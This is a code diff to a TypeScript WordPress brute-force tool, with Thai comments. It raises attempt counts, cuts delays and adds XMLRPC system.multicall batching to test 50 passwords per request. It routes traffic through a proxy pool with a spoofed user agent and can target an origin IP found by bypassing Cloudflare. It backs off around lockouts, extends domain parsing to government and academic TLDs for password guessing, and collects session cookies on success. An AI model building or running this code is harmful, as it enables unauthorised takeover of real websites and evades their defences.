@@ -44,11 +44,12 @@ export interface BruteForceResult {
 export interface BruteForceConfig {
   targetUrl: string;
   domain: string;
-  maxAttempts?: number;        // default 50
-  delayBetweenAttempts?: number; // ms, default 1000
-  lockoutDelay?: number;       // ms, default 30000
-  maxLockouts?: number;        // max lockout count before abort, default 3
-  globalTimeout?: number;      // ms, max total time for brute force, default 120000 (2min)
+  maxAttempts?: number;        // default 500 (XMLRPC has no rate limit on most sites)
+  delayBetweenAttempts?: number; // ms, default 50 for XMLRPC, 500 for wp-login
+  lockoutDelay?: number;       // ms, default 15000
+  maxLockouts?: number;        // max lockout count before abort, default 5
+  globalTimeout?: number;      // ms, max total time for brute force, default 300000 (5min)
+  useMulticall?: boolean;      // use XMLRPC system.multicall for 50x speed, default true
   customUsernames?: string[];
   customPasswords?: string[];
   originIP?: string;           // ถ้ามี origin IP จาก CF bypass
@@ -135,7 +136,10 @@ function caseVariants(str: string): string[] {
 
 /** Extract meaningful parts from domain */
 function parseDomainParts(domain: string): { full: string; parts: string[]; numbers: string; letters: string } {
-  const name = domain.replace(/\.(com|net|org|io|co|info|biz|xyz|site|online|store|shop|club|app|dev|tech|pro|me|us|uk|th|asia|cc|tv|gg|bet|casino|poker|game|play|win|fun|live|vip)$/i, "");
+  // Handle multi-part TLDs first (.edu.pe, .co.uk, .ac.th, .go.th, .or.jp, etc.)
+  const name = domain
+    .replace(/\.(edu|ac|go|gov|co|or|ne|mil|org|net|com|gob)\.(pe|uk|th|jp|kr|cn|tw|au|nz|br|mx|ar|cl|co|in|id|my|sg|ph|vn|za|ke|ng|eg|il|sa|ae|ru|ua|pl|cz|de|fr|es|it|nl|be|at|ch|se|no|dk|fi|pt|gr|hu|ro|bg|hr|sk|si|lt|lv|ee)$/i, "")
+    .replace(/\.(com|net|org|io|co|info|biz|xyz|site|online|store|shop|club|app|dev|tech|pro|me|us|uk|th|asia|cc|tv|gg|bet|casino|poker|game|play|win|fun|live|vip|edu|gov|mil|int|ac|pe|br|mx|ar|cl|au|nz|jp|kr|cn|tw|in|id|my|sg|ph|vn|za|ke|ng|eg|il|sa|ae|ru|ua|pl|cz|de|fr|es|it|nl|be|at|ch|se|no|dk|fi|pt|gr|hu|ro|bg|hr|sk|si|lt|lv|ee)$/i, "");
   const full = name.replace(/[^a-zA-Z0-9]/g, "");
   // Split by separators: 168-topgame → ["168", "topgame"]
   const parts = name.split(/[-_.]/).filter(p => p.length > 0);
@@ -297,11 +301,11 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
   const startTime = Date.now();
   const log = (msg: string) => config.onProgress?.(`[WP-BruteForce] ${msg}`);
   
-  const maxAttempts = config.maxAttempts || 50;
-  const delayMs = config.delayBetweenAttempts || 1000;
-  const lockoutDelay = config.lockoutDelay || 30000;
-  const maxLockouts = config.maxLockouts || 3;
-  const globalTimeout = config.globalTimeout || 120000; // 2 min
+  const maxAttempts = config.maxAttempts || 500;
+  const delayMs = config.delayBetweenAttempts ?? 50; // 50ms for XMLRPC (no rate limit);
+  const lockoutDelay = config.lockoutDelay || 15000;
+  const maxLockouts = config.maxLockouts || 5;
+  const globalTimeout = config.globalTimeout || 300000; // 5 min default // 2 min
   let lockoutCount = 0;
   const deadline = Date.now() + globalTimeout;
 
@@ -360,58 +364,126 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
   
   if (xmlrpcAvailable) {
     log("XMLRPC available — ใช้ wp.getUsersBlogs method");
-    for (const username of allUsernames) {
-      for (const password of allPasswords) {
-        if (result.attemptsMade >= maxAttempts) {
-          log(`⚠️ ถึง max attempts (${maxAttempts})`);
-          break;
-        }
-        if (Date.now() > deadline) {
-          log(`⏰ Global timeout (${globalTimeout / 1000}s) — abort brute force`);
-          result.errors.push('global_timeout');
-          break;
-        }
-        if (result.lockedOut) {
-          lockoutCount++;
-          if (lockoutCount >= maxLockouts) {
-            log(`🚫 Max lockouts (${maxLockouts}) reached — abort brute force`);
-            result.errors.push('max_lockouts_reached');
+    const useMulticall = config.useMulticall !== false; // default true
+    const MULTICALL_BATCH = 50; // 50 passwords per request
+
+    // Phase 2a: Try XMLRPC multicall first (50x faster)
+    if (useMulticall) {
+      log(`🚀 ลอง XMLRPC multicall (${MULTICALL_BATCH} passwords/request)...`);
+      let multicallSupported = true;
+
+      for (const username of allUsernames) {
+        if (!multicallSupported) break;
+        // Batch passwords into chunks of MULTICALL_BATCH
+        for (let i = 0; i < allPasswords.length; i += MULTICALL_BATCH) {
+          if (result.attemptsMade >= maxAttempts || Date.now() > deadline) break;
+          if (result.lockedOut) {
+            lockoutCount++;
+            if (lockoutCount >= maxLockouts) {
+              log(`🚫 Max lockouts (${maxLockouts}) reached`);
+              result.errors.push('max_lockouts_reached');
+              break;
+            }
+            log(`⏳ Locked out (${lockoutCount}/${maxLockouts}) — รอ ${lockoutDelay / 1000}s...`);
+            await sleep(lockoutDelay);
+            result.lockedOut = false;
+          }
+
+          const batch = allPasswords.slice(i, i + MULTICALL_BATCH);
+          const mcResult = await tryXMLRPCMulticall(baseUrl, username, batch, hostHeader);
+
+          if (mcResult.tested === 0 && !mcResult.lockout) {
+            // multicall not supported — fall back to single requests
+            log("⚠️ multicall not supported — fallback to single requests");
+            multicallSupported = false;
             break;
           }
-          log(`⏳ Locked out (${lockoutCount}/${maxLockouts}) — รอ ${lockoutDelay / 1000}s...`);
-          await sleep(lockoutDelay);
-          result.lockedOut = false;
-        }
 
-        result.attemptsMade++;
-        const xmlrpcResult = await tryXMLRPC(baseUrl, username, password, hostHeader);
-        
-        if (xmlrpcResult === "success") {
-          log(`✅ XMLRPC Login สำเร็จ: ${username}:${password}`);
-          result.success = true;
-          result.credentials = {
-            username,
-            password,
-            method: "xmlrpc",
-            authHeader: `Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`,
-          };
-          
-          // Get WP cookies + nonce for REST API
-          const wpAuth = await getWPAuthCookies(baseUrl, username, password, config.domain, hostHeader);
-          if (wpAuth) {
-            result.credentials.cookies = wpAuth.cookies;
-            result.credentials.nonce = wpAuth.nonce;
+          result.attemptsMade += mcResult.tested || batch.length;
+          log(`  Tested ${result.attemptsMade}/${allPasswords.length * allUsernames.length} (user: ${username}, batch ${Math.floor(i / MULTICALL_BATCH) + 1})`);
+
+          if (mcResult.lockout) {
+            result.lockedOut = true;
+            continue;
           }
-          
-          result.duration = Date.now() - startTime;
-          return result;
-        } else if (xmlrpcResult === "lockout") {
-          result.lockedOut = true;
-        }
 
-        if (delayMs > 0) await sleep(delayMs);
+          if (mcResult.found) {
+            log(`✅ XMLRPC Multicall Login สำเร็จ: ${mcResult.found.username}:${mcResult.found.password}`);
+            result.success = true;
+            result.credentials = {
+              username: mcResult.found.username,
+              password: mcResult.found.password,
+              method: "xmlrpc",
+              authHeader: `Basic ${Buffer.from(`${mcResult.found.username}:${mcResult.found.password}`).toString("base64")}`,
+            };
+            const wpAuth = await getWPAuthCookies(baseUrl, mcResult.found.username, mcResult.found.password, config.domain, hostHeader);
+            if (wpAuth) {
+              result.credentials.cookies = wpAuth.cookies;
+              result.credentials.nonce = wpAuth.nonce;
+            }
+            result.duration = Date.now() - startTime;
+            return result;
+          }
+
+          if (delayMs > 0) await sleep(delayMs);
+        }
+        if (result.attemptsMade >= maxAttempts || Date.now() > deadline || lockoutCount >= maxLockouts) break;
       }
-      if (result.attemptsMade >= maxAttempts || Date.now() > deadline || lockoutCount >= maxLockouts) break;
+    }
+
+    // Phase 2b: Fallback to single XMLRPC requests (if multicall failed/not supported)
+    if (!result.success && result.attemptsMade < maxAttempts && Date.now() < deadline && lockoutCount < maxLockouts) {
+      log("Phase 2b: Single XMLRPC requests...");
+      for (const username of allUsernames) {
+        for (const password of allPasswords) {
+          if (result.attemptsMade >= maxAttempts) {
+            log(`⚠️ ถึง max attempts (${maxAttempts})`);
+            break;
+          }
+          if (Date.now() > deadline) {
+            log(`⏰ Global timeout (${globalTimeout / 1000}s) — abort brute force`);
+            result.errors.push('global_timeout');
+            break;
+          }
+          if (result.lockedOut) {
+            lockoutCount++;
+            if (lockoutCount >= maxLockouts) {
+              log(`🚫 Max lockouts (${maxLockouts}) reached — abort brute force`);
+              result.errors.push('max_lockouts_reached');
+              break;
+            }
+            log(`⏳ Locked out (${lockoutCount}/${maxLockouts}) — รอ ${lockoutDelay / 1000}s...`);
+            await sleep(lockoutDelay);
+            result.lockedOut = false;
+          }
+
+          result.attemptsMade++;
+          const xmlrpcResult = await tryXMLRPC(baseUrl, username, password, hostHeader);
+
+          if (xmlrpcResult === "success") {
+            log(`✅ XMLRPC Login สำเร็จ: ${username}:${password}`);
+            result.success = true;
+            result.credentials = {
+              username,
+              password,
+              method: "xmlrpc",
+              authHeader: `Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`,
+            };
+            const wpAuth = await getWPAuthCookies(baseUrl, username, password, config.domain, hostHeader);
+            if (wpAuth) {
+              result.credentials.cookies = wpAuth.cookies;
+              result.credentials.nonce = wpAuth.nonce;
+            }
+            result.duration = Date.now() - startTime;
+            return result;
+          } else if (xmlrpcResult === "lockout") {
+            result.lockedOut = true;
+          }
+
+          if (delayMs > 0) await sleep(delayMs);
+        }
+        if (result.attemptsMade >= maxAttempts || Date.now() > deadline || lockoutCount >= maxLockouts) break;
+      }
     }
   } else {
     log("XMLRPC not available — ใช้ wp-login.php");
@@ -604,6 +676,108 @@ async function checkXMLRPC(baseUrl: string, hostHeader?: string): Promise<boolea
     return false;
   } catch {
     return false;
+  }
+}
+
+/**
+ * XMLRPC system.multicall — test up to BATCH_SIZE passwords in ONE request
+ * Returns: { found: {username, password} | null, lockout: boolean, tested: number }
+ */
+async function tryXMLRPCMulticall(
+  baseUrl: string,
+  username: string,
+  passwords: string[],
+  hostHeader?: string
+): Promise<{ found: { username: string; password: string } | null; lockout: boolean; tested: number }> {
+  try {
+    const headers: Record<string, string> = {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Content-Type": "text/xml",
+    };
+    if (hostHeader) headers["Host"] = hostHeader;
+
+    // Build multicall XML — each call is wp.getUsersBlogs(username, password)
+    const calls = passwords.map(pw => `
+      <value><struct>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>${escapeXml(username)}</string></value>
+          <value><string>${escapeXml(pw)}</string></value>
+        </data></array></value></member>
+      </struct></value>`).join("\n");
+
+    const xmlBody = `<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params><param><value><array><data>
+    ${calls}
+  </data></array></value></param></params>
+</methodCall>`;
+
+    const { response } = await fetchWithPoolProxy(
+      `${baseUrl}/xmlrpc.php`,
+      {
+        method: "POST",
+        headers,
+        body: xmlBody,
+        signal: AbortSignal.timeout(30000),
+      },
+      { targetDomain: hostHeader || new URL(baseUrl).hostname, timeout: 30000 }
+    );
+
+    const body = await response.text();
+
+    // Lockout detection
+    if (response.status === 429 || body.includes("Too many") || body.includes("locked") || body.includes("blocked")) {
+      return { found: null, lockout: true, tested: 0 };
+    }
+
+    // If multicall not supported (some sites disable it), return null
+    if (body.includes("<fault>") && body.includes("server error")) {
+      return { found: null, lockout: false, tested: 0 };
+    }
+
+    // Parse multicall response — each result is either success (array with blog info) or fault
+    // Success pattern: <array><data><value><struct><member>...<name>blogid</name>...
+    // Fault pattern: <struct><member><name>faultCode</name>...
+    const resultBlocks = body.split("</value>\n      </data></array></value>");
+    
+    // Alternative: count <struct> blocks in response to match with passwords
+    // Each response item is wrapped in <value> inside the outer <data>
+    // Success: contains <member><name>blogid</name> or <member><name>isAdmin</name>
+    // Fail: contains <name>faultCode</name>
+    
+    // Simple approach: look for blogid/isAdmin patterns and count faultCode patterns
+    // to determine which index succeeded
+    let idx = 0;
+    const valueRegex = /<value>\s*<array>\s*<data>([\s\S]*?)<\/data>\s*<\/array>\s*<\/value>/g;
+    const faultRegex = /<value>\s*<struct>\s*<member>\s*<name>faultCode<\/name>/g;
+    
+    // Split by top-level response values
+    // The multicall response is: <array><data> <value>result1</value> <value>result2</value> ... </data></array>
+    // Each result is either: <array><data>...</data></array> (success) or <struct><member><name>faultCode... (fail)
+    const topValues = body.match(/<value>\s*(?:<array>|<struct>)[\s\S]*?(?:<\/array>|<\/struct>)\s*<\/value>/g) || [];
+    
+    // Skip the outer wrapper — we need the inner values
+    // Better approach: find all wp.getUsersBlogs results by checking for blogid or faultCode
+    for (let i = 0; i < passwords.length && i < topValues.length; i++) {
+      const block = topValues[i] || "";
+      // Success: contains blogid or isAdmin without faultCode
+      if ((block.includes("blogid") || block.includes("isAdmin")) && !block.includes("faultCode")) {
+        return { found: { username, password: passwords[i] }, lockout: false, tested: i + 1 };
+      }
+    }
+
+    // Fallback: if we can't parse the response properly, check if ANY success exists
+    // and fall back to single-request mode
+    if (body.includes("blogid") && !body.includes("faultCode")) {
+      // At least one succeeded but we can't determine which — try each one individually
+      return { found: null, lockout: false, tested: passwords.length };
+    }
+
+    return { found: null, lockout: false, tested: passwords.length };
+  } catch {
+    return { found: null, lockout: false, tested: 0 };
   }
 }
 
